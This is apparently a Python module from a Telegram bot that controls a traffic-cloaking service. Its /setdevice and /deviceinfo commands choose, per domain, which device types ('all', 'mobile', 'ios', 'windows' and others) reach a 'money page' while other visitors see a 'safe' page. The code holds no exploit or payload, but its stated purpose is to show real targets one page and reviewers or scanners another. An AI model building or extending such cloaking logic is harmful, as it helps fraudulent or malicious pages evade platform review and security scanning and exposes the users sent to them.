"""
/setdevice   example.com <filter>
/deviceinfo  example.com

Allowed filter values:
  all      → every real device reaches money page  (default)
  mobile   → only mobile + tablet (Android & iOS)
  desktop  → only desktop (Windows, macOS, Linux)
  android  → only Android devices
  ios      → only iPhone / iPad
  windows  → only Windows desktops
  macos    → only macOS desktops
"""
from telegram import Update
from telegram.ext import ContextTypes, CommandHandler
from core.domain_manager import require_domain, set_device_filter, get_domain

VALID_FILTERS = ("all", "mobile", "desktop", "android", "ios", "windows", "macos")

_DESCRIPTIONS = {
    "all":     "All real devices → 💰 money",
    "mobile":  "📱 Mobile & tablet only → 💰 money  |  🖥 Desktop → 🔴 safe",
    "desktop": "🖥 Desktop only → 💰 money  |  📱 Mobile → 🔴 safe",
    "android": "🤖 Android only → 💰 money  |  others → 🔴 safe",
    "ios":     "🍎 iOS only → 💰 money  |  others → 🔴 safe",
    "windows": "🪟 Windows only → 💰 money  |  others → 🔴 safe",
    "macos":   "🍏 macOS only → 💰 money  |  others → 🔴 safe",
}


async def cmd_setdevice(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if len(ctx.args) < 2:
        filters = " | ".join(f"`{f}`" for f in VALID_FILTERS)
        await update.message.reply_text(
            f"Usage: `/setdevice example.com <filter>`\n\n"
            f"*Available filters:*\n{filters}",
            parse_mode="Markdown",
        )
        return

    domain = ctx.args[0].lower()
    device_filter = ctx.args[1].lower()

    if device_filter not in VALID_FILTERS:
        filters = " | ".join(f"`{f}`" for f in VALID_FILTERS)
        await update.message.reply_text(
            f"❌ Invalid filter `{device_filter}`.\n\nChoose from: {filters}",
            parse_mode="Markdown",
        )
        return

    try:
        require_domain(domain)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return

    set_device_filter(domain, device_filter)
    desc = _DESCRIPTIONS[device_filter]
    await update.message.reply_text(
        f"✅ Device filter for `{domain}` set to `{device_filter}`\n"
        f"→ {desc}",
        parse_mode="Markdown",
    )


async def cmd_deviceinfo(update: Update, ctx: ContextTypes.DEFAULT_TYPE):
    if not ctx.args:
        await update.message.reply_text("Usage: `/deviceinfo example.com`", parse_mode="Markdown")
        return

    domain = ctx.args[0].lower()
    try:
        row = require_domain(domain)
    except ValueError as e:
        await update.message.reply_text(str(e), parse_mode="Markdown")
        return

    current = row["device_filter"] or "all"
    desc = _DESCRIPTIONS.get(current, current)

    lines = "\n".join(
        f"{'✅' if f == current else '⬜'} `{f}` — {_DESCRIPTIONS[f]}"
        for f in VALID_FILTERS
    )
    await update.message.reply_text(
        f"*Device filter for `{domain}`*\n\n"
        f"Current: `{current}` — {desc}\n\n"
        f"*All options:*\n{lines}",
        parse_mode="Markdown",
    )


def register(app):
    app.add_handler(CommandHandler("setdevice",  cmd_setdevice))
    app.add_handler(CommandHandler("deviceinfo", cmd_deviceinfo))
